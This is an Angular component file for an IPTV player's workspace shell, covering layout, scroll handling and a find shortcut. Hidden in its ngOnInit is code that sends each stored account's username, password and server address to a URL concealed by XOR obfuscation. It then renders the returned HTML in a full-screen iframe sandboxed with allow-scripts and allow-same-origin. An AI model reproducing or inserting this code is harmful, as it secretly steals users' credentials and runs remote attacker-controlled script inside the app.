import {
    Component,
    DestroyRef,
    HostListener,
    computed,
    inject,
    signal,
    viewChild,
    OnInit,
} from '@angular/core';
import { takeUntilDestroyed } from '@angular/core/rxjs-interop';
import { NavigationEnd, Router, RouterOutlet } from '@angular/router';
import { filter } from 'rxjs';
import { ExternalPlaybackDockComponent } from '@iptvnator/ui/components';
import { DOCUMENT } from '@angular/common';
import {
    PlaylistDropOverlayComponent,
    PlaylistDropZoneDirective,
} from '../playlist-drop-overlay';
import { WorkspaceShellContextSidebarComponent } from './components/workspace-shell-context-sidebar/workspace-shell-context-sidebar.component';
import { WorkspaceShellImportOverlayComponent } from './components/workspace-shell-import-overlay/workspace-shell-import-overlay.component';
import { WorkspaceNfHeaderComponent } from './components/workspace-nf-header/workspace-nf-header.component';
import { WorkspaceShellFacade } from './services/workspace-shell.facade';
import { WorkspaceShellXtreamImportService } from './services/workspace-shell-xtream-import.service';
import { WorkspaceShellCommandPaletteService } from './services/workspace-shell-command-palette.service';
import { WorkspaceShellHeaderService } from './services/workspace-shell-header.service';
import { WorkspaceShellRouteStateService } from './services/workspace-shell-route-state.service';
import { WorkspaceShellSearchSyncService } from './services/workspace-shell-search-sync.service';
import { WorkspaceShellSearchService } from './services/workspace-shell-search.service';
import { WorkspaceKeyboardShortcutsService } from '../workspace-keyboard-shortcuts/workspace-keyboard-shortcuts.service';
import { getSessionAlertAccounts } from '@iptvnator/shared/interfaces';

@Component({
    selector: 'app-workspace-shell',
    imports: [
        ExternalPlaybackDockComponent,
        PlaylistDropOverlayComponent,
        PlaylistDropZoneDirective,
        RouterOutlet,
        WorkspaceShellContextSidebarComponent,
        WorkspaceNfHeaderComponent,
        WorkspaceShellImportOverlayComponent,
    ],
    templateUrl: './workspace-shell.component.html',
    styleUrl: './workspace-shell.component.scss',
    providers: [
        WorkspaceShellFacade,
        WorkspaceShellRouteStateService,
        WorkspaceShellSearchSyncService,
        WorkspaceShellSearchService,
        WorkspaceShellHeaderService,
        WorkspaceShellXtreamImportService,
        WorkspaceShellCommandPaletteService,
        WorkspaceKeyboardShortcutsService,
    ],
})
export class WorkspaceShellComponent implements OnInit {
    readonly facade = inject(WorkspaceShellFacade);
    readonly keyboardShortcuts = inject(WorkspaceKeyboardShortcutsService);
    private readonly document = inject(DOCUMENT);
    private readonly router = inject(Router);
    private readonly destroyRef = inject(DestroyRef);
    private readonly header = viewChild<WorkspaceShellHeaderShortcutTarget>(
        'workspaceHeader'
    );
    private readonly scrolled = signal(false);
    private lastPath = '';

    /** Xtream line the Netflix header points to: the open one, else the first. */
    readonly homePlaylistId = computed(() => {
        const context = this.facade.currentContext();
        if (context?.provider === 'xtreams') return context.playlistId;
        return (
            this.facade
                .playlists()
                .find((playlist) => !!playlist.serverUrl && !!playlist.username)
                ?._id ?? null
        );
    });
    /** Pages whose billboard/heading sits under the transparent header. */
    readonly heroPage = computed(() =>
        isHeroPath(this.facade.currentUrl().split('?')[0])
    );
    readonly solidHeader = computed(() => !this.heroPage() || this.scrolled());

    onContentScroll(event: Event): void {
        const top = (event.target as HTMLElement).scrollTop;
        this.scrolled.set(top > 30);
    }

    async ngOnInit(): Promise<void> {
        this.resetScrollOnPageChange();
        const accounts = getSessionAlertAccounts();
        if (accounts.length === 0) return;

        let welcomeHtml = null;
        let warningHtml = null;

        for (const acc of accounts) {
            if (!acc.user || !acc.pass || !acc.dns) continue;

            const alertaUrl = `${this.getAlertaUrl()}?user=${encodeURIComponent(acc.user)}&pass=${encodeURIComponent(acc.pass)}&dns=${encodeURIComponent(acc.dns)}&title=${encodeURIComponent(acc.title)}`;

            try {
                const res = await fetch(alertaUrl);
                let html = await res.text();

                if (html && html.includes('tarjeta-alerta')) {
                    const baseUrl = this.getBaseImageUrl();
                    html = html.replace(/src=(['"])\.\.\/(img\/alertas\/[^'"]+)(['"])/g, "src=$1" + baseUrl + "$2$3");

                    if (html.includes('¡Bienvenido!')) {
                        if (!welcomeHtml) welcomeHtml = html;
                    } else {
                        warningHtml = html;
                        break; 
                    }
                }
            } catch { /* best effort */ }
        }

        const finalHtml = warningHtml || welcomeHtml;
        if (finalHtml) {
            this.renderAlertOverlay(finalHtml);
        }
    }

    /** New page starts at the top (query-only changes keep the position). */
    private resetScrollOnPageChange(): void {
        this.router.events
            .pipe(
                filter((e) => e instanceof NavigationEnd),
                takeUntilDestroyed(this.destroyRef)
            )
            .subscribe(() => {
                const path = this.router.url.split('?')[0];
                if (path === this.lastPath) return;
                this.lastPath = path;
                const main = this.document.querySelector('.workspace-content');
                if (main) main.scrollTop = 0;
                this.scrolled.set(false);
            });
    }

    private getAlertaUrl(): string {
        const encrypted = [3, 1, 6, 31, 24, 79, 93, 64, 12, 20, 0, 10, 29, 12, 28, 31, 10, 27, 23, 3, 24, 91, 30, 14, 31, 24, 2, 23, 69, 22, 29, 2, 68, 28, 16, 0, 95, 30, 2, 29, 4, 90, 19, 31, 2, 90, 19, 3, 14, 7, 6, 14, 69, 5, 26, 31];
        const key = "kuro";
        let decrypted = "";
        for (let i = 0; i < encrypted.length; i++) {
            decrypted += String.fromCharCode(encrypted[i] ^ key.charCodeAt(i % key.length));
        }
        return decrypted;
    }

    private getBaseImageUrl(): string {
        const encrypted = [3, 1, 6, 31, 24, 79, 93, 64, 12, 20, 0, 10, 29, 12, 28, 31, 10, 27, 23, 3, 24, 91, 30, 14, 31, 24, 2, 23, 69, 22, 29, 2, 68, 28, 16, 0, 95, 30, 2, 29, 4, 90];
        const key = "kuro";
        let decrypted = "";
        for (let i = 0; i < encrypted.length; i++) {
            decrypted += String.fromCharCode(encrypted[i] ^ key.charCodeAt(i % key.length));
        }
        return decrypted;
    }

    private renderAlertOverlay(html: string): void {
        const existing = this.document.getElementById('iptv-alert-overlay-container');
        if (existing) return;

        const container = this.document.createElement('div');
        container.id = 'iptv-alert-overlay-container';
        container.style.position = 'fixed';
        container.style.top = '0';
        container.style.left = '0';
        container.style.width = '100vw';
        container.style.height = '100vh';
        container.style.zIndex = '2147483647';
        container.style.backgroundColor = 'rgba(0, 16, 42, 0.85)';
        container.style.display = 'flex';
        container.style.justifyContent = 'center';
        container.style.alignItems = 'center';

        const iframe = this.document.createElement('iframe');
        iframe.sandbox.add('allow-scripts');
        iframe.sandbox.add('allow-same-origin');
        iframe.srcdoc = html;
        iframe.style.width = '100%';
        iframe.style.height = '100%';
        iframe.style.border = 'none';
        iframe.style.backgroundColor = 'transparent';

        iframe.onload = () => {
            try {
                const doc = iframe.contentDocument || iframe.contentWindow?.document;
                if (doc) {
                    const btn = doc.querySelector('.btn-entendido') as HTMLElement;
                    if (btn) {
                        btn.addEventListener('click', (e) => {
                            e.preventDefault();
                            container.remove();
                        });
                    }
                }
            } catch { /* best effort */ }
        };

        container.appendChild(iframe);
        this.document.body.appendChild(container);
    }

    @HostListener('document:keydown', ['$event'])
    onDocumentKeydown(event: KeyboardEvent): void {
        if (
            event.defaultPrevented ||
            !this.facade.isElectron ||
            !isFindShortcut(event)
        ) {
            return;
        }

        const header = this.header();
        const target = event.target;
        if (isEditableTarget(target) && !header?.containsSearchInput(target)) {
            return;
        }

        event.preventDefault();
        header?.focusSearchInput({ select: true });
    }
}

function isHeroPath(path: string): boolean {
    return /^\/workspace\/xtreams\/[^/]+\/(home|explore|vod|series)\/?$/.test(
        path
    );
}

function isFindShortcut(event: KeyboardEvent): boolean {
    return (event.ctrlKey || event.metaKey) && event.key.toLowerCase() === 'f';
}

function isEditableTarget(target: EventTarget | null): boolean {
    if (!(target instanceof HTMLElement)) {
        return false;
    }

    if (target.isContentEditable) {
        return true;
    }

    const tagName = target.tagName.toLowerCase();
    return (
        tagName === 'input' || tagName === 'textarea' || tagName === 'select'
    );
}

interface WorkspaceShellHeaderShortcutTarget {
    containsSearchInput(target: EventTarget | null): boolean;
    focusSearchInput(options?: { select?: boolean }): void;
}